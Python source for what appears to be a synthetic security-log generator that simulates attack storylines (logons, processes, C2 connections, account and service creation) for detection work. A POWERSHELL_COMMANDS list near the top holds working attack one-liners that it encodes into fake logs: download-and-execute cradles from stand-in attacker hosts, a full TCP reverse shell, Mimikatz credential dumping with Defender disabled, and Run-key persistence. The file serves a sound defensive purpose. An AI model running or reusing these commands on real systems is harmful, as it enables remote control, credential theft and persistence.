"""Storyline event scheduling and execution methods.

Contains the StorylineMixin with methods for:
- Storyline event execution (single and batch)
- Typed event dispatch (logon, process, connection, etc.)
- Supplementary event emission
- Command-line output file extraction
- Encoded PowerShell generation
"""

import base64
import logging
import re
from datetime import datetime, timedelta

from evidenceforge.models.scenario import System, User
from evidenceforge.utils.rng import _get_rng
from evidenceforge.utils.time import parse_duration, parse_iso8601

logger = logging.getLogger(__name__)

# Realistic decoded PowerShell commands for base64 encoding
POWERSHELL_COMMANDS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
    "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
    "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
    "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
    "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
    "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
    "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
    "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
    "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
]


class StorylineMixin:
    """Mixin providing storyline event scheduling and execution methods."""

    def _ensure_account_sid_tracking(self) -> None:
        """Initialize the account SID tracking dict if not already present."""
        if not hasattr(self, "_created_account_sids"):
            self._created_account_sids: dict[str, str] = {}

    def _execute_storyline(self) -> None:
        """Execute storyline events (malicious/suspicious activities).

        Parses storyline events, executes them at specified times, and tracks
        them for GROUND_TRUTH.md generation. Implements baseline suppression
        (+/-5 min window) to avoid conflicts with baseline activity.

        Phase 1 Implementation:
        - Simple keyword matching for activity types
        - Basic event generation based on activity description
        - Tracking of malicious events for ground truth
        """
        total_events = len(self.scenario.storyline)
        _prev_event_time = None
        self._ensure_account_sid_tracking()

        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
            event_time = self._parse_storyline_time(storyline_event.time)
            rng = _get_rng()
            jitter = timedelta(
                seconds=rng.uniform(-30, 30),
                microseconds=rng.randint(0, 999999),
            )
            event_time = event_time + jitter
            if _prev_event_time and event_time <= _prev_event_time:
                event_time = _prev_event_time + timedelta(milliseconds=rng.randint(100, 5000))
            _prev_event_time = event_time

            actor = self._find_actor(storyline_event.actor)
            system = self._find_system(storyline_event.system)

            if not actor or not system:
                logger.warning(
                    f"Skipping storyline event: actor={storyline_event.actor}, "
                    f"system={storyline_event.system} not found"
                )
                continue

            logger.info(
                f"Executing storyline event: {storyline_event.actor} on "
                f"{storyline_event.system} at {event_time}"
            )

            self._report_progress(
                "storyline_progress",
                {
                    "event_num": event_num,
                    "total_events": total_events,
                    "actor": actor.username,
                    "system": system.hostname,
                },
            )

            self.state_manager.set_current_time(event_time)
            explicit_types = {spec.type for spec in storyline_event.events}

            for spec in storyline_event.events:
                malicious_event = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_time,
                    activity=storyline_event.activity,
                    explicit_types=explicit_types,
                )
                if malicious_event:
                    self.malicious_events.append(malicious_event)

            self._barrier_flush_all_emitters()

    def _execute_single_storyline_event(self, event_idx: int) -> None:
        """Execute a single storyline event by index (used for interleaved generation)."""
        self._ensure_account_sid_tracking()
        storyline_event = self.scenario.storyline[event_idx]
        event_idx + 1

        event_time = self._parse_storyline_time(storyline_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(storyline_event.actor)
        system = self._find_system(storyline_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in storyline_event.events}
        for spec in storyline_event.events:
            malicious_event = self._execute_typed_event(
                spec=spec,
                actor=actor,
                system=system,
                time=event_time,
                activity=storyline_event.activity,
                explicit_types=explicit_types,
            )
            if malicious_event:
                self.malicious_events.append(malicious_event)

    def _execute_typed_event(
        self,
        spec,  # EventSpec union type
        actor: User,
        system: System,
        time: datetime,
        activity: str,
        explicit_types: set[str],
    ) -> dict | None:
        """Execute a single typed event from the storyline events list.

        Each event spec type maps to a specific generate_* method on ActivityGenerator.
        Returns a malicious_event dict for GROUND_TRUTH.md.
        """
        rng = _get_rng()
        malicious_event = {
            "time": time,
            "actor": actor.username,
            "system": system.hostname,
            "activity": activity,
            "type": spec.type,
        }

        if spec.type == "logon":
            _attacker_ips = [
                "45.33.32.156",
                "185.220.101.34",
                "91.219.236.174",
                "23.129.64.210",
                "116.202.120.181",
            ]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            logon_id = self.activity_generator.generate_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
            )
            malicious_event["logon_id"] = logon_id
            malicious_event["source_ip"] = source_ip

        elif spec.type == "failed_logon":
            _attacker_ips = ["45.33.32.156", "185.220.101.34", "91.219.236.174"]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                None,
            )
            self.activity_generator.generate_failed_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
                target_username=getattr(spec, "target_username", None),
                dc_system=dc,
            )
            malicious_event["source_ip"] = source_ip

        elif spec.type == "logoff":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            target_session = next((s for s in sessions if s.system == system.hostname), None)
            if target_session:
                self.activity_generator.generate_logoff(
                    actor, system, time, target_session.logon_id
                )

        elif spec.type == "process":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            target_session = next((s for s in sessions if s.system == system.hostname), None)
            if not target_session:
                logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                logon_id = self.activity_generator.generate_logon(
                    actor, system, logon_time, logon_type=3
                )
            else:
                logon_id = target_session.logon_id

            from evidenceforge.generation.activity import _get_os_category

            os_category = _get_os_category(system.os)
            process_name = spec.process_name
            command_line = spec.command_line or process_name

            if os_category == "linux":
                self.activity_generator.generate_bash_command(actor, system, time, command_line)

            if "<base64_encoded_command>" in command_line:
                command_line = command_line.replace(
                    "<base64_encoded_command>",
                    self._generate_encoded_powershell(hash(f"{time}_{actor.username}")),
                )

            parent_pid = self.activity_generator._select_parent_pid(system, actor, process_name)
            pid = self.activity_generator.generate_process(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
                process_name=process_name,
                command_line=command_line,
                parent_pid=parent_pid,
            )
            self.activity_generator._record_user_process(system, actor, pid, process_name)
            self._last_storyline_pid = pid
            self._last_storyline_image = process_name
            self._last_storyline_system = system.hostname
            malicious_event["process_name"] = process_name
            malicious_event["command_line"] = command_line
            malicious_event["pid"] = pid

            output_file = self._extract_output_file(command_line, os_category)
            if output_file:
                file_time = time + timedelta(seconds=rng.uniform(0.5, 3.0))
                from evidenceforge.events.base import SecurityEvent
                from evidenceforge.events.contexts import AuthContext, FileContext

                host_ctx = self.activity_generator._build_host_context(system)
                self.dispatcher.dispatch(
                    SecurityEvent(
                        timestamp=file_time,
                        event_type="file_create",
                        host=host_ctx,
                        auth=AuthContext(username=actor.username),
                        file=FileContext(path=output_file, action="create", pid=pid),
                    )
                )
                malicious_event["output_file"] = output_file

            _EXPLICIT_CRED_TOOLS = {"psexec", "wmic", "runas", "schtasks", "net.exe", "net1.exe"}
            proc_basename = (
                process_name.rsplit("\\", 1)[-1].lower()
                if "\\" in process_name
                else process_name.lower()
            )
            if proc_basename in _EXPLICIT_CRED_TOOLS and os_category == "windows":
                cred_time = time - timedelta(milliseconds=rng.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=actor,
                    system=system,
                    time=cred_time,
                    target_username=actor.username,
                    target_server="localhost",
                    process_name=process_name,
                    process_pid=pid,
                )

            if os_category == "windows" and getattr(spec, "supplementary", "auto") != "none":
                self._emit_supplementary_events(
                    actor,
                    system,
                    time,
                    command_line,
                    pid,
                    logon_id,
                    skip_types=explicit_types,
                )

        elif spec.type == "connection":
            _c2_ips = ["159.65.43.201", "134.209.29.115", "167.71.156.88"]
            source_ip = spec.source_ip or system.ip
            dst_ip = spec.dst_ip
            dst_port = spec.dst_port
            service = spec.service or (
                "ssl" if dst_port == 443 else "http" if dst_port == 80 else "ssl"
            )
            # Build HttpContext if HTTP fields are provided
            http_ctx = None
            if spec.method or spec.uri:
                from evidenceforge.events.contexts import HttpContext
                from evidenceforge.generation.activity.network import (
                    REVERSE_DNS,
                    _generate_random_hostname,
                )

                http_host = REVERSE_DNS.get(dst_ip)
                if not http_host:
                    http_host = _generate_random_hostname(rng, dst_ip)
                resp_bytes = rng.randint(5000, 50000)
                http_ctx = HttpContext(
                    method=spec.method or "GET",
                    host=http_host,
                    uri=spec.uri or "/",
                    version="1.1",
                    user_agent=spec.user_agent or "Mozilla/5.0",
                    request_body_len=rng.randint(0, 500) if spec.method == "POST" else 0,
                    response_body_len=resp_bytes,
                    status_code=spec.status_code or 200,
                    status_msg={
                        200: "OK",
                        301: "Moved Permanently",
                        302: "Found",
                        403: "Forbidden",
                        404: "Not Found",
                        500: "Internal Server Error",
                    }.get(spec.status_code or 200, "OK"),
                    resp_mime_types=["text/html"] if (spec.status_code or 200) == 200 else [],
                    tags=[],
                )

            uid = self.activity_generator.generate_connection(
                src_ip=source_ip,
                dst_ip=dst_ip,
                time=time,
                dst_port=dst_port,
                service=service,
                duration=rng.uniform(1.0, 30.0),
                orig_bytes=rng.randint(1000, 10000),
                resp_bytes=rng.randint(5000, 50000),
                emit_dns=True,
                source_system=system,
                http=http_ctx,
            )
            malicious_event["dst_ip"] = dst_ip
            malicious_event["dst_port"] = dst_port
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "ssh_session":
            source_ip = spec.source_ip or system.ip
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            uid = self.activity_generator.generate_ssh_session(
                user=actor,
                target_system=target,
                time=time,
                source_ip=source_ip,
            )
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 22
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "rdp_session":
            source_ip = spec.source_ip or system.ip
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            uid = self.activity_generator.generate_rdp_session(
                user=actor,
                target_system=target,
                time=time,
                source_ip=source_ip,
            )
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 3389
            malicious_event["uid"] = uid if uid else "(filtered by sensor placement)"

        elif spec.type == "account_created":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            self.activity_generator.generate_account_created(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            # Store SID for later reuse by group_member_added
            self._created_account_sids[spec.target_username] = target_sid
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "account_deleted":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            self.activity_generator.generate_account_deleted(
                actor=actor,
                system=dc,
                time=time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "group_member_added":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            group_rid = 512 if "admin" in spec.group_name.lower() else rng.randint(1100, 9999)
            group_sid = self._make_domain_sid(group_rid)
            # Reuse SID from earlier account_created event, or generate new
            member_sid = (
                self._created_account_sids.get(spec.member_name)
                or self.activity_generator.sid_registry.get(spec.member_name)
                or self._make_domain_sid()
            )
            self.activity_generator.generate_group_membership_change(
                actor=actor,
                system=dc,
                time=time,
                action="add",
                scope=spec.scope,
                group_name=spec.group_name,
                group_sid=group_sid,
                member_username=spec.member_name,
                member_sid=member_sid,
            )
            malicious_event["group_name"] = spec.group_name
            malicious_event["member_name"] = spec.member_name

        elif spec.type == "service_installed":
            self.activity_generator.generate_service_installed(
                user=actor,
                system=system,
                time=time,
                service_name=spec.service_name,
                service_file_name=spec.service_file_name,
                service_account=spec.service_account,
            )
            malicious_event["service_name"] = spec.service_name

        elif spec.type == "scheduled_task_created":
            task_content = spec.task_content
            if not task_content:
                # Generate realistic XML task content from the task name
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\n"
                    f'      <Arguments>/c "{spec.task_name}"</Arguments>\n'
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            self.activity_generator.generate_scheduled_task(
                user=actor,
                system=system,
                time=time,
                task_name=spec.task_name,
                action="created",
                task_content=task_content,
            )
            malicious_event["task_name"] = spec.task_name

        elif spec.type == "log_cleared":
            self.activity_generator.generate_log_cleared(user=actor, system=system, time=time)

        elif spec.type == "create_remote_thread":
            source_pid = getattr(self, "_last_storyline_pid", 0) or 0
            source_image = getattr(self, "_last_storyline_image", "") or "unknown"
            # Use a realistic target PID — look up the process name from
            # system PIDs or use a plausible default (not 4 = System kernel)
            target_name = spec.target_process.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            target_pid = self.activity_generator._get_system_pid(
                system.hostname,
                target_name.replace(".exe", ""),
                0x27C,  # 636 default
            )
            self.activity_generator.generate_create_remote_thread(
                user=actor,
                system=system,
                time=time,
                source_pid=source_pid,
                source_image=source_image,
                target_pid=target_pid,
                target_image=spec.target_process,
            )
            # Also emit Sysmon Event 10 (ProcessAccess) when targeting lsass.exe
            # This is the primary credential-dumping detection in real environments
            if "lsass" in target_name:
                access_time = time + timedelta(milliseconds=rng.randint(1, 50))
                self.activity_generator.generate_process_access(
                    user=actor,
                    system=system,
                    time=access_time,
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=spec.target_process,
                    granted_access="0x1010",  # PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ
                )
            malicious_event["target_process"] = spec.target_process

        elif spec.type == "raw":
            self.activity_generator.generate_raw(
                time=time,
                target_format=spec.target_format,
                fields=spec.fields,
                system=system,
            )
            malicious_event["target_format"] = spec.target_format

        return malicious_event

    def _emit_supplementary_events(
        self,
        actor: User,
        system: System,
        time: datetime,
        command_line: str,
        pid: int,
        logon_id: str,
        skip_types: set[str] | None = None,
    ) -> None:
        """Emit supplementary Windows events based on command-line patterns.

        Detects administrative commands (net user, net group, schtasks, sc create,
        wevtutil cl) and emits corresponding high-level audit events (4720, 4726,
        4728, 4697, 4698, 1102) that Windows would generate alongside the 4688.

        skip_types: set of event types already explicitly declared in the storyline
        events list. Supplementary inference skips these to avoid duplicates.
        """
        skip_types = skip_types or set()
        cmd_lower = command_line.lower()

        dc = next(
            (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
            system,
        )

        rng = _get_rng()
        delay_s = rng.uniform(0.1, 0.5)

        def _domain_sid_prefix() -> str:
            for sid in self.activity_generator.sid_registry.values():
                if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
                    return "-".join(sid.split("-")[:7])
            return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}"

        def _make_sid(rid: int | None = None) -> str:
            prefix = _domain_sid_prefix()
            if rid is None:
                rid = rng.randint(1100, 9999)
            return f"{prefix}-{rid}"

        # net user <name> /add /domain -> 4720 (account created)
        match = re.search(r"net\s+user\s+(\S+)\s+\S+\s+/add", cmd_lower)
        if match and "account_created" not in skip_types:
            orig_match = re.search(r"net\s+user\s+(\S+)\s+\S+\s+/add", command_line, re.IGNORECASE)
            target_name = orig_match.group(1) if orig_match else match.group(1)
            target_sid = _make_sid()
            self.activity_generator.generate_account_created(
                actor=actor,
                system=dc,
                time=time + timedelta(seconds=delay_s),
                target_username=target_name,
                target_sid=target_sid,
            )
            # Store SID for later group_member_added reuse
            self._ensure_account_sid_tracking()
            self._created_account_sids[target_name] = target_sid

        # net user <name> /delete /domain -> 4726 (account deleted)
        match = re.search(r"net\s+user\s+(\S+)\s+/delete", cmd_lower)
        if match and "account_deleted" not in skip_types:
            orig_match = re.search(r"net\s+user\s+(\S+)\s+/delete", command_line, re.IGNORECASE)
            target_name = orig_match.group(1) if orig_match else match.group(1)
            target_sid = _make_sid()
            self.activity_generator.generate_account_deleted(
                actor=actor,
                system=dc,
                time=time + timedelta(seconds=delay_s),
                target_username=target_name,
                target_sid=target_sid,
            )

        # net group "<GroupName>" <user> /add /domain -> 4728 (global group member added)
        match = re.search(r'net\s+group\s+"?([^"]+)"?\s+(\S+)\s+/add', command_line, re.IGNORECASE)
        if match and "group_member_added" not in skip_types:
            group_name = match.group(1)
            member_name = match.group(2)
            group_rid = 512 if "admin" in group_name.lower() else rng.randint(1100, 9999)
            group_sid = _make_sid(group_rid)
            # Reuse SID from earlier account_created if available
            self._ensure_account_sid_tracking()
            member_sid = (
                self._created_account_sids.get(member_name)
                or self.activity_generator.sid_registry.get(member_name)
                or _make_sid()
            )
            self.activity_generator.generate_group_membership_change(
                actor=actor,
                system=dc,
                time=time + timedelta(seconds=delay_s),
                action="add",
                scope="global",
                group_name=group_name,
                group_sid=group_sid,
                member_username=member_name,
                member_sid=member_sid,
            )

        # schtasks /Create ... /TN "<TaskName>" -> 4698 (scheduled task created)
        match = re.search(r'schtasks\s+/create\b.*?/tn\s+"?([^"]+)"?', command_line, re.IGNORECASE)
        if match and "scheduled_task_created" not in skip_types:
            task_name = match.group(1)
            tr_match = re.search(r'/tr\s+"?([^"]+)"?', command_line, re.IGNORECASE)
            task_action = tr_match.group(1) if tr_match else ""
            self.activity_generator.generate_scheduled_task(
                user=actor,
                system=system,
                time=time + timedelta(seconds=delay_s),
                task_name=task_name,
                action="created",
                task_content=f"<Actions><Exec><Command>{task_action}</Command></Exec></Actions>",
            )

        # sc create <ServiceName> binPath= "<path>" -> 4697 (service installed)
        match = re.search(
            r'sc\s+create\s+(\S+)\s+binpath=\s*"?([^"]+)"?', command_line, re.IGNORECASE
        )
        if match and "service_installed" not in skip_types:
            svc_name = match.group(1)
            svc_path = match.group(2)
            self.activity_generator.generate_service_installed(
                user=actor,
                system=system,
                time=time + timedelta(seconds=delay_s),
                service_name=svc_name,
                service_file_name=svc_path,
            )

        # wevtutil cl Security -> 1102 (log cleared)
        if "wevtutil" in cmd_lower and "cl" in cmd_lower and "log_cleared" not in skip_types:
            self.activity_generator.generate_log_cleared(
                user=actor,
                system=system,
                time=time + timedelta(seconds=delay_s),
            )

    @staticmethod
    def _extract_output_file(command_line: str, os_category: str) -> str | None:
        """Extract output file path from a command line string.

        Detects common output file patterns in PowerShell, cmd, and Linux commands.
        Returns the file path if found, None otherwise.
        """
        patterns = [
            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',  # PowerShell Export-Csv
            r'-OutFile\s+[\'"]?([^\s\'">;]+)',  # PowerShell -OutFile
            r'Out-File\s+[\'"]?([^\s\'">;]+)',  # PowerShell Out-File
            r'>\s*[\'"]?([^\s\'">;]+)',  # Shell redirect >
            r'-o\s+[\'"]?([^\s\'">;]+)',  # Common -o flag
            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',  # --output flag
        ]
        for pattern in patterns:
            match = re.search(pattern, command_line, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _parse_storyline_time(self, time_str: str) -> datetime:
        """Parse storyline event time to absolute datetime.

        Supports:
        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
        - Relative offset (duration): "+2h30m"
        - Relative offset (seconds): "+7200"

        Args:
            time_str: Time string to parse

        Returns:
            Absolute datetime (UTC)

        Raises:
            ValueError: If time format is invalid
        """
        if time_str[0].isdigit() and len(time_str) > 10:
            return parse_iso8601(time_str)

        if time_str.startswith("+"):
            offset_str = time_str[1:]
            if offset_str.isdigit():
                offset = timedelta(seconds=int(offset_str))
            else:
                offset = parse_duration(offset_str)
            return self.start_time + offset

        raise ValueError(f"Invalid storyline time format: {time_str}")

    def _make_domain_sid(self, rid: int | None = None) -> str:
        """Generate a SID using the scenario's domain SID prefix."""
        rng = _get_rng()
        for sid in self.activity_generator.sid_registry.values():
            if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
                prefix = "-".join(sid.split("-")[:7])
                return f"{prefix}-{rid or rng.randint(1100, 9999)}"
        return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rid or rng.randint(1100, 9999)}"

    def _generate_encoded_powershell(self, seed: int) -> str:
        """Generate a realistic base64-encoded PowerShell command.

        PowerShell -enc expects UTF-16LE encoded base64.
        """
        rng = _get_rng()
        cmd = rng.choice(POWERSHELL_COMMANDS)
        return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
